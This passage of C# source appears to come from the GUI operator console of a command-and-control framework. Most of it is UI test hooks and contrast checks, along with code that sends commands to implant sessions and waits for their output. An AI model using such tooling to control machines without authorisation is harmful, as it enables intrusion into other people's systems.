                    lg.Owner = this;
                    lg.KindBox.SelectedIndex = 0;                        // http
                    lg.AddrBox.Text = ListenerParse.AddressExample("http");
                    string e1 = await SubmitListenerAsync(lg);
                    sb.AppendLine("listener[HTTP " + lg.AddrValue + "] 提交 -> 框内显示 = " + e1);
                    sb.AppendLine("    状态栏 = " + StatusBar.Text);
                    lg.Close();

                    var lg2 = new ListenerDialog("tcp");
                    lg2.Owner = this;
                    lg2.KindBox.SelectedIndex = 2;                        // tcp
                    lg2.AddrBox.Text = "127.0.0.1:8699";
                    string e2 = await SubmitListenerAsync(lg2);
                    sb.AppendLine("listener[TCP " + lg2.AddrValue + "] 提交 -> 框内显示 = "
                                + (e2.Length == 0 ? "(空 = 成功, 对话框会关闭)" : e2));
                    sb.AppendLine("    状态栏 = " + StatusBar.Text);
                    lg2.Close();

                    var ua = new UserDialog("new", "");
                    ua.Owner = this;
                    ua.UserBox.Text = "admin";                            // 与默认管理员重名
                    ua.PassBox.Password = "Live-Pass-001";
                    ua.Pass2Box.Password = "Live-Pass-001";
                    string e3 = await SubmitAddUserAsync(ua);
                    sb.AppendLine("user[重名 admin] 提交 -> 框内显示 = " + e3);
                    sb.AppendLine("    状态栏 = " + StatusBar.Text);
                    ua.Close();

                    var ub = new UserDialog("new", "");
                    ub.Owner = this;
                    ub.UserBox.Text = "live_op";
                    ub.RoleBox.SelectedIndex = 0;                         // operator
                    ub.PassBox.Password = "Live-Pass-002";
                    ub.Pass2Box.Password = "Live-Pass-002";
                    string e4 = await SubmitAddUserAsync(ub);
                    sb.AppendLine("user[新建 live_op] 提交 -> 框内显示 = "
                                + (e4.Length == 0 ? "(空 = 成功, 对话框会关闭)" : e4));
                    sb.AppendLine("    状态栏 = " + StatusBar.Text);
                    ub.Close();

                    await FetchUsersAsync(true);
                    sb.AppendLine("提交后 GET /api/users 行数 = " + _users.Count);
                    for (int i = 0; i < _users.Count; i++)
                        sb.AppendLine("    行[" + i + "] " + _users[i].User + " | " + _users[i].RoleText);
                }
                else if (live)
                {
                    sb.AppendLine("== 实弹提交跳过: 没有令牌 (未登录) ==");
                }
            }
            catch (Exception ex)
            {
                sb.AppendLine("DIALOG DUMP 失败: " + ex.GetType().Name + ": " + ex.Message);
            }

            try { File.WriteAllText(path, sb.ToString(), new UTF8Encoding(true)); } catch { }
        }

        /// <summary>
        /// 自动化验证钩子: CSDEV_GUI_SHOT=&lt;路径&gt; 时把窗口**当前渲染结果**存成 PNG。
        /// 进程内 RenderTargetBitmap 取像, 不依赖屏幕抓屏 (无头/远程桌面下也能留证据),
        /// 因此看到的就是 WPF 真正画出来的像素 (能直接判断"表格被挤没了"这类布局事故)。
        /// 只读, 不改变任何行为; 不设置该变量时零开销。
        /// </summary>
        private void ShotUiIfRequested()
        {
            string path = "";
            try { path = Environment.GetEnvironmentVariable("CSDEV_GUI_SHOT"); } catch { }
            if (string.IsNullOrEmpty(path)) return;
            try
            {
                UpdateLayout();
                int w = (int)Math.Max(1, ActualWidth);
                int h = (int)Math.Max(1, ActualHeight);
                var bmp = new RenderTargetBitmap(w, h, 96, 96, PixelFormats.Pbgra32);
                bmp.Render(this);
                var enc = new PngBitmapEncoder();
                enc.Frames.Add(BitmapFrame.Create(bmp));
                using (var fs = new FileStream(path, FileMode.Create, FileAccess.Write))
                    enc.Save(fs);
            }
            catch (Exception ex)
            {
                try { File.AppendAllText(path + ".err.txt", "SHOT 失败: " + ex.Message); } catch { }
            }
        }

        /// <summary>
        /// 自动化验证钩子: CSDEV_GUI_COMBO_PROBE=&lt;路径&gt; 时依次切到每个页面, 把该页所有
        /// ComboBox 展开, 落盘一份配色实测报告 + 每个弹出层的实际渲染 PNG。
        ///
        /// 为什么必须单独有这么一个钩子: WPF 的 Popup 是独立顶层窗口, 不在主窗口可视化树里,
        /// 所以 CSDEV_GUI_SHOT 那个 RenderTargetBitmap(this) **永远拍不到展开后的下拉列表** ——
        /// "下拉展开到底看不看得见字"在无人值守回归里一直是盲区, 只能靠人眼在真机上碰运气。
        /// 这里改成直接渲染 Popup.Child, 并把逐项前景/背景换算成 WCAG 对比度,
        /// 让"能不能看清"从主观判断变成可断言的数字。
        /// 只读; 不设置该变量时零开销。
        /// </summary>
        private async Task ProbeCombosIfRequestedAsync()
        {
            string path = "";
            try { path = Environment.GetEnvironmentVariable("CSDEV_GUI_COMBO_PROBE") ?? ""; } catch { }
            if (string.IsNullOrEmpty(path)) return;

            await Task.Delay(1500);   // 等首轮拉取把下拉项填满
            var sb = new StringBuilder();
            var lightSb = new StringBuilder();               // 亮色底/边框扫描结果
            var lightSeen = new HashSet<DependencyObject>(); // 顶栏控件每页都在, 去重
            string prevTab = "";
            var shell = ItemsControl.ItemsControlFromItemContainer(TabSessions) as TabControl;
            if (shell == null) { File.WriteAllText(path, "找不到 TabControl", new UTF8Encoding(true)); return; }
            try
            {
                var sel = shell.SelectedItem as TabItem;
                prevTab = sel == null ? "" : sel.Name;

                int total = 0;
                var seen = new HashSet<ComboBox>();   // 顶栏的地址下拉在每个页都在, 只测一次
                for (int t = 0; t < shell.Items.Count; t++)
                {
                    var ti = shell.Items[t] as TabItem;
                    if (ti == null) continue;
                    ti.IsSelected = true;
                    await Task.Delay(280);      // TabControl 惰性生成可视化树, 必须等它落地
                    UpdateLayout();
                    ScanLight(this, lightSb, 0, "", lightSeen);   // 每页扫一遍, 找残余亮色底

                    // 注意: 页面内容不在 TabItem 的可视化子树里 (它在 TabControl 模板的
                    // ContentPresenter 下), 所以必须从窗口根往下扫, 而不是从 tab 往下扫。
                    var all = new List<ComboBox>();
                    CollectCombos(this, all);
                    var combos = new List<ComboBox>();
                    for (int i = 0; i < all.Count; i++) if (seen.Add(all[i])) combos.Add(all[i]);
                    if (combos.Count == 0) continue;

                    sb.AppendLine("== 页面 [" + ti.Header + "] (" + ti.Name + ") 下拉框 " + combos.Count + " 个 ==");
                    for (int i = 0; i < combos.Count; i++)
                    {
                        total++;
                        await ProbeOneComboAsync(combos[i], sb, path);
                    }
                    sb.AppendLine();
                }
                await ProbeDialogCombosAsync(sb, path, lightSb, lightSeen);
                sb.AppendLine("== 亮色底/边框扫描 (亮度阈值 0.5, 已排除透明/半透明) ==");
                sb.Append(lightSb.Length == 0
                        ? "   干净: 整棵可视化树没有任何亮色背景/边框\r\n"
                        : lightSb.ToString());
                sb.AppendLine();
                sb.Insert(0, "下拉框配色实测: 共 " + total + " 个 (主窗口)"
                            + " (对比度按 WCAG 相对亮度: >=4.5 清晰, >=3 勉强, <3 看不清)\r\n");
                File.WriteAllText(path, sb.ToString(), new UTF8Encoding(true));
            }
            catch (Exception ex)
            {
                try { File.AppendAllText(path, "\r\nPROBE 失败: " + ex, new UTF8Encoding(true)); } catch { }
            }
            finally
            {
                try { var back = FindName(prevTab) as TabItem; if (back != null) back.IsSelected = true; } catch { }
            }
        }

        /// <summary>展开一个下拉框并实测: 控件色 / 弹出层外框色 / 逐项色 / 实际像素。</summary>
        private async Task ProbeOneComboAsync(ComboBox cb, StringBuilder sb, string basePath)
        {
            string name = string.IsNullOrEmpty(cb.Name) ? "无名" : cb.Name;
            sb.AppendLine("-- ComboBox " + name
                        + " | 项数=" + cb.Items.Count
                        + " | 选中=" + Describe(cb.SelectedItem)
                        + " | 尺寸=" + cb.ActualWidth.ToString("0") + "x" + cb.ActualHeight.ToString("0"));
            sb.AppendLine("   控件 Background=" + HexOf(cb.Background) + " Foreground=" + HexOf(cb.Foreground)
                        + " 对比度=" + Contrast(cb.Background, cb.Foreground).ToString("0.00"));
            sb.AppendLine("   ItemContainerStyle=" + (cb.ItemContainerStyle == null ? "(null)" : "已设")
                        + " / ItemTemplate=" + (cb.ItemTemplate == null ? "(null)" : "已设")
                        + " / Template=" + (cb.Template == null ? "(null)" : "系统或自定义"));

            cb.IsDropDownOpen = true;
            await Task.Delay(500);      // 让出 UI 线程, 等 Popup 真正打开

            var popup = cb.Template == null ? null
                      : cb.Template.FindName("PART_Popup", cb) as System.Windows.Controls.Primitives.Popup;
            if (popup == null)
            {
                sb.AppendLine("   !! 模板里找不到 PART_Popup (自定义模板漏了它就打不开弹出层)");
                cb.IsDropDownOpen = false;
                return;
            }
            sb.AppendLine("   Popup.IsOpen=" + popup.IsOpen + " AllowsTransparency=" + popup.AllowsTransparency
                        + " Child=" + (popup.Child == null ? "(null)" : popup.Child.GetType().Name));

            var fe = popup.Child as FrameworkElement;
            if (fe != null)
            {
                fe.UpdateLayout();
                sb.AppendLine("   弹出层实测尺寸=" + fe.ActualWidth.ToString("0") + "x" + fe.ActualHeight.ToString("0"));
                DumpBorders(fe, sb, "     ");
                string png = basePath + "." + SafeName(name) + ".png";
                try { RenderTo(fe, png); sb.AppendLine("   已导出 " + png); }
                catch (Exception ex) { sb.AppendLine("   PNG 导出失败: " + ex.Message); }
            }

            for (int i = 0; i < cb.Items.Count && i < 10; i++)
            {
                var c = cb.ItemContainerGenerator.ContainerFromIndex(i) as ComboBoxItem;
                if (c == null) { sb.AppendLine("   项[" + i + "] (未实例化)"); continue; }
                sb.AppendLine("   项[" + i + "] " + Describe(cb.Items[i])
                            + " | Background=" + HexOf(c.Background) + " Foreground=" + HexOf(c.Foreground)
                            + " | 对比度=" + Contrast(c.Background, c.Foreground).ToString("0.00"));
            }
            cb.IsDropDownOpen = false;
            await Task.Delay(120);
        }

        /// <summary>
        /// 独立对话框里的下拉框 (新建监听器 / 操作员账号 / SOCKS 代理)。
        ///
        /// 必须单独测: 它们是独立 Window, 不在主窗口可视化树里, 上面那轮从主窗口根往下扫
        /// **扫不到** —— "监听器那个选项框看不见" 就是从这个盲区漏过去的:
        /// 主窗口四个下拉框当时全是干净的 #171C26, 而真正出问题的是这个对话框里的 KindBox。
        /// 这里把三个对话框真构造出来 (用 Show 而非 ShowDialog, 免得阻塞这条 async 链),
        /// 测完立刻 Close。
        /// </summary>
        private async Task ProbeDialogCombosAsync(StringBuilder sb, string basePath,
                                                  StringBuilder lightSb, HashSet<DependencyObject> seen)
        {
            var wins = new List<Window>();
            try { wins.Add(new ListenerDialog("tcp")); }
            catch (Exception ex) { sb.AppendLine("ListenerDialog 构造失败: " + ex.Message + "\r\n"); }
            try { wins.Add(new UserDialog("new", "")); }
            catch (Exception ex) { sb.AppendLine("UserDialog 构造失败: " + ex.Message + "\r\n"); }
            try { wins.Add(new ProxyDialog("socks", _sessions, CurrentSessionRow())); }
            catch (Exception ex) { sb.AppendLine("ProxyDialog 构造失败: " + ex.Message + "\r\n"); }

            sb.AppendLine("== 独立对话框 (不在主窗口可视化树里, 主窗口那轮扫不到) ==");
            for (int i = 0; i < wins.Count; i++)
            {
                Window w = wins[i];
                string tag = w.GetType().Name;
                try
                {
                    w.Owner = this;
                    w.ShowInTaskbar = false;
                    w.WindowStartupLocation = WindowStartupLocation.CenterOwner;
                    w.Show();
                    await Task.Delay(500);
                    w.UpdateLayout();
                    ScanLight(w, lightSb, 0, "对话框:" + tag, seen);
                    var combos = new List<ComboBox>();
                    CollectCombos(w, combos);
                    sb.AppendLine("-- " + tag + " \"" + w.Title + "\" 下拉框 " + combos.Count + " 个");
                    for (int k = 0; k < combos.Count; k++)
                        await ProbeOneComboAsync(combos[k], sb, basePath + "." + tag);
                }
                catch (Exception ex) { sb.AppendLine("   测试 " + tag + " 失败: " + ex.Message); }
                finally { try { w.Close(); } catch { } }
                await Task.Delay(200);
                sb.AppendLine();
            }
        }

        /// <summary>
        /// 扫描可视化树里所有"亮色"背景/边框 —— 直接回答"界面上还有哪里是白的"。
        ///
        /// 只报相对亮度 >= 0.5 且不透明的, 所以深色主题下任何一条命中都是真问题:
        /// 主题色板里最亮的 Accent #4A9EFF 亮度也只有 0.33, 不会误报。
        /// 之前的坑就是靠肉眼找白点, 找到一处改一处; 这个扫描让"还有没有白的"变成可枚举的。
        /// </summary>
        private static void ScanLight(DependencyObject root, StringBuilder sb, int depth,
                                      string path, HashSet<DependencyObject> seen)
        {
            if (root == null || depth > 40) return;
            if (!seen.Add(root)) return;

            var fe = root as FrameworkElement;
            string name = fe == null ? "" : fe.Name;
            var bd = root as Border;
            var ctl = root as Control;
            Brush bg = bd != null ? bd.Background : (ctl == null ? null : ctl.Background);
            Brush br = bd != null ? bd.BorderBrush : (ctl == null ? null : ctl.BorderBrush);
            string par = ParentInfo(root);
            ReportLight(sb, path, root.GetType().Name, name, "Background", bg, par);
            ReportLight(sb, path, root.GetType().Name, name, "BorderBrush", br, par);

            int n = VisualTreeHelper.GetChildrenCount(root);
            for (int i = 0; i < n; i++)
                ScanLight(VisualTreeHelper.GetChild(root, i), sb, depth + 1,
                          path + "/" + root.GetType().Name, seen);
        }

        /// <summary>父级类型 + 名字 —— 定位亮色元素到底挂在谁下面, 光看类型名定位不到。</summary>
        private static string ParentInfo(DependencyObject d)
        {
            var p = VisualTreeHelper.GetParent(d);
            if (p == null) return "-";
            var pfe = p as FrameworkElement;
            return p.GetType().Name + (pfe != null && !string.IsNullOrEmpty(pfe.Name) ? "(" + pfe.Name + ")" : "");
        }

        private static void ReportLight(StringBuilder sb, string path, string type, string name,
                                        string which, Brush b, string parent)
        {
            var s = b as SolidColorBrush;
            if (s == null) return;
            if (s.Color.A < 200) return;                 // 透明/半透明不算
            double lum = Luminance(s.Color);
            if (lum < 0.5) return;                       // 只报亮色
            string p = path.Length > 110 ? "..." + path.Substring(path.Length - 110) : path;
            sb.AppendLine("   [亮] " + which + "=" + HexOf(b) + " 亮度=" + lum.ToString("0.00")
                        + "  @ " + type + (name.Length == 0 ? "" : "(" + name + ")")
                        + " 父=" + parent
                        + "  路径=" + p);
        }

        private static void CollectCombos(DependencyObject root, List<ComboBox> sink)
        {
            if (root == null) return;
            var cb = root as ComboBox;
            if (cb != null) sink.Add(cb);
            int n = VisualTreeHelper.GetChildrenCount(root);
            for (int i = 0; i < n; i++) CollectCombos(VisualTreeHelper.GetChild(root, i), sink);
        }

        /// <summary>把弹出层可视化树里每个 Border 的实测底色写出来 —— 直接回答"外框是不是白的"。</summary>
        private static void DumpBorders(DependencyObject root, StringBuilder sb, string indent)
        {
            if (root == null) return;
            var b = root as Border;
            if (b != null)
                sb.AppendLine(indent + "Border " + (string.IsNullOrEmpty(b.Name) ? "(无名)" : b.Name)
                            + " bg=" + HexOf(b.Background)
                            + " 尺寸=" + b.ActualWidth.ToString("0") + "x" + b.ActualHeight.ToString("0"));
            int n = VisualTreeHelper.GetChildrenCount(root);
            for (int i = 0; i < n; i++) DumpBorders(VisualTreeHelper.GetChild(root, i), sb, indent);
        }

        private static string HexOf(Brush br)
        {
            var s = br as SolidColorBrush;
            if (s != null) return "#" + s.Color.R.ToString("X2") + s.Color.G.ToString("X2") + s.Color.B.ToString("X2");
            return br == null ? "(null)" : "(" + br.GetType().Name + ")";
        }

        /// <summary>WCAG 相对亮度对比度, 把"看不看得见"变成数字。</summary>
        private static double Contrast(Brush bg, Brush fg)
        {
            var a = bg as SolidColorBrush;
            var c = fg as SolidColorBrush;
            if (a == null || c == null) return -1;
            double l1 = Luminance(c.Color), l2 = Luminance(a.Color);
            if (l1 < l2) { double t = l1; l1 = l2; l2 = t; }
            return (l1 + 0.05) / (l2 + 0.05);
        }

        private static double Luminance(Color c)
        {
            return 0.2126 * Chan(c.R) + 0.7152 * Chan(c.G) + 0.0722 * Chan(c.B);
        }

        private static double Chan(byte v)
        {
            double x = v / 255.0;
            return x <= 0.03928 ? x / 12.92 : Math.Pow((x + 0.055) / 1.055, 2.4);
        }

        private static string SafeName(string s)
        {
            var sb = new StringBuilder();
            for (int i = 0; i < s.Length; i++) sb.Append(char.IsLetterOrDigit(s[i]) ? s[i] : '_');
            return sb.ToString();
        }

        /// <summary>取绑定源的显示属性 (Display/Text/Label), 拿不到就 ToString。</summary>
        private static string Describe(object o)
        {
            if (o == null) return "(null)";
            Type t = o.GetType();
            var p = t.GetProperty("Display") ?? t.GetProperty("Text") ?? t.GetProperty("Label");
            if (p != null) { try { return Convert.ToString(p.GetValue(o)); } catch { } }
            return o.ToString();
        }

        private static void RenderTo(FrameworkElement fe, string path)
        {
            int w = (int)Math.Max(1, Math.Round(fe.ActualWidth));
            int h = (int)Math.Max(1, Math.Round(fe.ActualHeight));
            var bmp = new RenderTargetBitmap(w, h, 96, 96, PixelFormats.Pbgra32);
            bmp.Render(fe);
            var enc = new PngBitmapEncoder();
            enc.Frames.Add(BitmapFrame.Create(bmp));
            using (var fs = new FileStream(path, FileMode.Create, FileAccess.Write)) enc.Save(fs);
        }

        /// <summary>容器里已实例化 (真正渲染出来) 的顶层项数 —— 虚拟化下它小于模型行数是正常的。</summary>
        private static int RealizedRows(ItemsControl ic)
        {
            if (ic == null) return 0;
            int n = 0;
            for (int i = 0; i < ic.Items.Count; i++)
            {
                if (ic.ItemContainerGenerator.ContainerFromIndex(i) != null) n++;
            }
            return n;
        }

        /// <summary>取容器第一行里的第一个 CheckBox (按视觉树找), 未实例化时返回 null。</summary>
        private static CheckBox FirstCheckBox(ItemsControl ic)
        {
            if (ic == null) return null;
            DependencyObject c = ic.ItemContainerGenerator.ContainerFromIndex(0);
            if (c == null) return null;
            return FindChild<CheckBox>(c);
        }

        private static T FindChild<T>(DependencyObject d) where T : DependencyObject
        {
            if (d == null) return null;
            int n = VisualTreeHelper.GetChildrenCount(d);
            for (int i = 0; i < n; i++)
            {
                DependencyObject c = VisualTreeHelper.GetChild(d, i);
                var hit = c as T;
                if (hit != null) return hit;
                var deeper = FindChild<T>(c);
                if (deeper != null) return deeper;
            }
            return null;
        }

        // ------------------------------------------------------------ 通用

        private void SetStatus(string msg)
        {
            StatusBar.Text = msg;
        }

        private void SetRight(string msg)
        {
            StatusRight.Text = msg;
        }

        private void UpdateRight()
        {
            string auth = _authUser.Length > 0
                ? _authUser + (_authRole.Length > 0 ? "(" + _authRole + ")" : "")
                : "-";
            SetRight("v2 " + _v2Count + "  ·  v1 " + _v1Count
                     + "  ·  auth " + auth
                     + "  ·  " + _api.BaseUrl);
        }

        /// <summary>定位开发根目录 (含 tools/gen_payload.ps1 的目录)。</summary>
        private static string FindDevRoot()
        {
            string dir = AppDomain.CurrentDomain.BaseDirectory;
            for (int i = 0; i < 6 && !string.IsNullOrEmpty(dir); i++)
            {
                try
                {
                    if (File.Exists(Path.Combine(dir, "tools", "gen_payload.ps1"))) return dir;
                }
                catch { }
                string parent = Path.GetDirectoryName(dir.TrimEnd('\\'));
                if (parent == null || parent == dir) break;
                dir = parent;
            }
            try { return Directory.GetCurrentDirectory(); } catch { return "."; }
        }

        private static long ParseLong(string s, long def)
        {
            long v;
            if (long.TryParse((s ?? "").Trim(), out v)) return v;
            return def;
        }

        /// <summary>
        /// 差分同步: 同主键的行原地合并 (值不变不触发通知), 新行按后端顺序插入,
        /// 消失的行删除。这样选中行、滚动位置、排序都不被破坏。
        /// </summary>
        private static void Sync<T>(ObservableCollection<T> target, IList<T> fresh) where T : RowBase, IKeyed
        {
            if (fresh == null) return;

            var index = new Dictionary<string, T>(StringComparer.Ordinal);
            for (int i = 0; i < target.Count; i++) index[target[i].Key] = target[i];

            var present = new HashSet<string>(StringComparer.Ordinal);
            for (int i = 0; i < fresh.Count; i++)
            {
                T src = fresh[i];
                present.Add(src.Key);
                T dst;
                if (index.TryGetValue(src.Key, out dst))
                {
                    dst.MergeFrom(src);
                }
                else
                {
                    if (i < target.Count) target.Insert(i, src);
                    else target.Add(src);
                }
            }

            for (int i = target.Count - 1; i >= 0; i--)
            {
                if (!present.Contains(target[i].Key)) target.RemoveAt(i);
            }
        }

        private static T FindAncestor<T>(DependencyObject start) where T : DependencyObject
        {
            while (start != null)
            {
                T hit = start as T;
                if (hit != null) return hit;

                DependencyObject parent = null;
                try { parent = VisualTreeHelper.GetParent(start); }
                catch
                {
                    // 命中 ContentElement (如 Run) 时视觉树会抛异常, 退到逻辑树
                    var fce = start as FrameworkContentElement;
                    if (fce != null) parent = fce.Parent;
                }
                start = parent;
            }
            return null;
        }

        private static BitmapImage MakeBitmap(byte[] bytes)
        {
            var bmp = new BitmapImage();
            bmp.BeginInit();
            // OnLoad: 立即解码进内存, 不持有流/文件句柄, 因此不会锁文件
            bmp.CacheOption = BitmapCacheOption.OnLoad;
            bmp.CreateOptions = BitmapCreateOptions.PreservePixelFormat;
            using (var ms = new MemoryStream(bytes))
            {
                bmp.StreamSource = ms;
                bmp.EndInit();
            }
            bmp.Freeze();
            return bmp;
        }

        private void OpenWithShell(string path, string verb)
        {
            try
            {
                if (string.IsNullOrEmpty(path)) { SetStatus("该记录没有本地路径, 可能来自其它主机"); return; }
                if (!File.Exists(path)) { SetStatus("本地文件不存在: " + path); return; }
                var psi = new ProcessStartInfo();
                if (verb == "reveal")
                {
                    psi.FileName = "explorer.exe";
                    psi.Arguments = "/select,\"" + path + "\"";
                }
                else
                {
                    psi.FileName = path;
                }
                psi.UseShellExecute = true;
                Process.Start(psi);
                SetStatus((verb == "reveal" ? "已在资源管理器中定位: " : "已用系统默认程序打开: ") + path);
            }
            catch (Exception ex)
            {
                SetStatus("打开失败: " + ex.Message);
            }
        }

        private void CopyToClipboard(string text, string what)
        {
            if (string.IsNullOrEmpty(text)) { SetStatus("没有可复制的内容 (" + what + ")"); return; }
            try
            {
                Clipboard.SetText(text);
                SetStatus("已复制" + what + "到剪贴板");
            }
            catch (Exception ex)
            {
                SetStatus("复制失败: " + ex.Message);
            }
        }

        // ------------------------------------------------------------ 轮询

        private async Task PollAsync()
        {
            if (_busy || !_running) return;
            _busy = true;
            try
            {
                using (var doc = await _api.GetStateAsync())
                {
                    ApplyState(doc.RootElement);
                }
                if (_failStreak > 0 || _inflight)
                {
                    SetStatus("已连接 " + _api.BaseUrl);
                }
                _failStreak = 0;
                _inflight = false;
                StatusDot.Fill = (Brush)FindResource("Ok");
                StatusDot.Effect = (System.Windows.Media.Effects.DropShadowEffect)FindResource("GlowOk");
                StatusText.Text = "已连接";

                await PollOutputAsync();
            }
            catch (Exception ex)
            {
                _failStreak++;
                _inflight = true;
                StatusDot.Fill = (Brush)FindResource("Err");
                StatusDot.Effect = (System.Windows.Media.Effects.DropShadowEffect)FindResource("GlowErr");
                StatusText.Text = "未连接";
                string msg = ex.Message ?? "";
                if (msg.IndexOf("401", StringComparison.Ordinal) >= 0
                    || msg.IndexOf("\u672a\u8ba4\u8bc1", StringComparison.Ordinal) >= 0
                    || msg.IndexOf("403", StringComparison.Ordinal) >= 0)
                {
                    // 服务端启用了 auth.go 访问控制
                    SetStatus("服务端要求认证: 请点顶栏『登录』填入操作员用户名与口令  [" + _api.BaseUrl + "]");
                }
                else
                {
                    SetStatus("服务端不可达 (" + _failStreak + "): " + msg + "  [" + _api.BaseUrl + "]");
                }
            }
            finally
            {
                _busy = false;
            }

            if (_curSid != _lastSidSeen)
            {
                _lastSidSeen = _curSid;
                RefreshDataViews();
            }
        }

        // ------------------------------------------------------------ 一次性等待收敛

        /// <summary>
        /// 下发一条命令并等待回传。
        ///
        /// 不新增网络定时器: 等待期复用 <see cref="_waitTimer"/> 以 200ms 周期调用
        /// 既有的 <see cref="PollAsync"/> (它负责拉 /api/state 与 /api/output 增量),
        /// 再从 <see cref="_outBuf"/> 按记录的开始游标切出新段。这样既不会与主轮询
        /// 抢游标, 也不会漏掉任何回传。
        ///
        /// <paramref name="quietEnd"/> 的语义: 5 秒静默且已有非空输出即视为传完
        /// (ps/ls 长列表由多帧拼成, 1 秒就收会让大列表被截断)。
        /// </summary>
        private async Task<CmdOutcome> SendWaitAsync(string sid, string cmd, bool quietEnd, int quietMs = 5000,
                                                     int firstOutputMs = 0)
        {
            if (string.IsNullOrEmpty(sid)) return CmdOutcome.Fail("没有选中会话");
            if (DataBusyLocked()) return CmdOutcome.Fail("上一个操作仍在等待回传");

            _dataBusy = true;
            _dataBusySince = DateTime.UtcNow;
            // 等待上限 + 余量。超了之后 DataBusyLocked() 会强制放行,
            // 不让一次异常把整个浏览器面板锁死。
            _dataBusyLimitSec = (firstOutputMs > 0 ? 3 : 15) + 10;
            _termAutoScroll = false;
            try
            {
                // 1) 先把游标推到最新, 保证之后的输出都属于这条命令
                using (var doc = await _api.GetOutputAsync(sid, _since))
                {
                    var root = doc.RootElement;
                    long s = _since;
                    foreach (var it in root.Arr("items"))
                    {
                        long ts = it.Long("ts");
                        if (ts >= s) s = ts + 1;
                        string t = Codec.B64(it.Str("text"));
                        if (t.Length > 0) _outBuf.Add(new KeyValuePair<long, string>(ts, t));
                    }
                    if (s > _since) _since = s;
                    if (sid == _curSid) _since = s;
                }

                long start = _since;

                using (var doc = await _api.SendCommandAsync(sid, cmd))
                {
                    var root = doc.RootElement;
                    if (!root.Bool("ok"))
                        return CmdOutcome.Fail(root.Str("error", "服务端未返回原因"));
                }
                AppendTermRaw("> " + cmd);

                _waitStartSince = start;
                _waitAborted = false;
                _waitEffLen = -1;
                // 超时按模式区分, 并且**跟会话的 sleep 挂钩**:
                //
                //   首帧模式 (ls / pwd / mkdir / rm): 命令下发后要等植入体下一次 check-in
                //     才会被取走 (最多 1 个 sleep), 执行完的结果又要等下一次 check-in 才回传
                //     (再 1 个 sleep) —— 所以下限是 **2×sleep**。
                //     这里取 2.5×sleep 再加 2 秒网络余量, 并保留 3 秒地板值。
                //     教训: 之前写死 3 秒, 遇到 sleep=5000ms 的会话必然超时,
                //     表现就是"明明命令发出去了, 文件列表一直是空的还报未收到回传"。
                //   通用模式 (ps / cat / download 等多帧): 保留 15 秒地板, 同样按 sleep 抬高。
                int sleepMs = SleepOfSession(sid);
                int floorSec = (firstOutputMs > 0) ? 3 : 15;
                int dynamicSec = (int)(sleepMs * 2.5 / 1000.0) + 2;
                int waitSec = Math.Max(floorSec, dynamicSec);
                _waitDeadline = DateTime.UtcNow.AddSeconds(waitSec);
                _waitLastProgress = DateTime.UtcNow;
                _waitActive = true;
                _waitTimer.Start();

                try
                {
                    int idle = 0;
                    string raw = "";

                    // 完成判据 (这里是"响应慢"的真正出处, 与 sleep/jitter 无关):
                    //   quietEnd=true  → ps/ls 这类长列表由多帧拼成, 用调用方给的长静默阈值;
                    //   quietEnd=false → 单帧回复。以前这里写的是 `quietEnd && ...`,
                    //                    等于 false 时**永不按静默结束**, 唯一的退出条件剩下
                    //                    15 秒硬超时 —— 每条 ls 都干等 15 秒才刷新。
                    //   firstOutputMs>0 → "首帧确认"模式: 一拿到输出, 只要再确认这么长时间
                    //                    没有新帧就返回。给那些**确定只有一帧响应**的命令用。
                    int quietTarget = quietEnd ? quietMs : SingleShotQuietMs;
                    while (true)
                    {
                        await Task.Delay(LoopMs);
                        bool aborted = _waitAborted;

                        // **静默的判据是"内容有没有增长", 不是"缓冲区里有没有内容"**。
                        //
                        // 而且必须先剔除**服务端的命令回显行** ("> ls /") 再看增长:
                        // 服务端收到 /api/command 时会立刻 pushOut 这一行 (本机往返, 几毫秒),
                        // 而真正的执行结果要等植入体一个 sleep 周期。把回显算成"有回传",
                        // 静默判定就会在真结果到达**之前**成立 —— 表现就是文件列表里
                        // 只剩下 "> ls /" 一行提示, 真实条目一个都没有。
                        //
                        // 历史病根: 原判据是 seg.Length > 0, 于是只要 _outBuf 里存在任何
                        // ts >= start 的条目 (哪怕就是这行回显), seg 就永远非空、idle 永远
                        // 是 0, 静默条件永不成立, 每条命令都干等到超时才返回。
                        // 实测: 单独发一条 pwd, 回传 3 毫秒就到, 却要 3051ms 才返回。
                        string seg = BufferSince(_waitStartSince);
                        string eff = StripCmdEcho(seg, cmd);
                        if (eff.Length > 0 && eff.Length != _waitEffLen)
                        {
                            idle = 0;
                            _waitLastProgress = DateTime.UtcNow;
                            _waitEffLen = eff.Length;
                            // 返回**剥离回显后**的内容: 调用方 (文件浏览器) 会直接拿它去
                            // 解析表格, 带上 "> ls /" 那一行就会多出一条假条目。
                            // 终端显示不受影响 —— 回显早就由 AppendTermRaw 单独写过了。
                            raw = eff;
                        }
                        else
                        {
                            idle++;
                        }

                        bool timeout = DateTime.UtcNow >= _waitDeadline
                                       || DateTime.UtcNow - _waitLastProgress >= TimeSpan.FromSeconds(waitSec);
                        if (aborted || timeout) break;

                        // 首帧确认: 文件浏览走这条。终端(_outBuf)是输出一到就显示, 而这里原来
                        // 要等满 400ms 静默才返回, 所以并排看会"终端先出、文件浏览后出"。
                        // ls 的输出是单帧到齐 (单帧上限 1.5MB, 单命令上限 400KB), 120ms
                        // 足够确认没有后续帧。
                        if (firstOutputMs > 0 && raw.Length > 0 && idle * LoopMs >= firstOutputMs) break;
                        if (raw.Length > 0 && idle * LoopMs >= quietTarget) break;
                    }

                    if (_waitAborted) return CmdOutcome.Fail("等待已取消 (会话已切换或断开)");
                    if (raw.Length == 0)
                    {
                        return CmdOutcome.Fail("未收到回传 (等待 " + waitSec + " 秒)。可能原因: 植入体 sleep 较长、"
                                               + "命令类别在植入体侧尚未实现、或该会话已离线。命令本身已下发, "
                                               + "回传若迟到会出现在会话终端。");
                    }
                    return CmdOutcome.Good(Codec.Clean(raw));
                }
                finally
                {
                    _waitActive = false;
                    _waitTimer.Stop();
                }
            }
            catch (Exception ex)
            {
                return CmdOutcome.Fail("网络异常: " + ex.Message);
            }
            finally
            {
                _dataBusy = false;
                _termAutoScroll = true;
            }
        }

        /// <summary>把缓冲里游标之后的内容拼成一段文本。</summary>
        private string BufferSince(long from)
        {
            var sb = new StringBuilder();
            for (int i = 0; i < _outBuf.Count; i++)
            {
                if (_outBuf[i].Key >= from) sb.Append(_outBuf[i].Value);
            }
            return sb.ToString();
        }

        /// <summary>
        /// 从等待片段里剔除**服务端的命令回显行** ("> &lt;cmd&gt;"), 只留真正的执行结果。
        ///
        /// 服务端收到 /api/command 时会立刻 pushOut 一行 "> ls /" —— 那是本机往返,
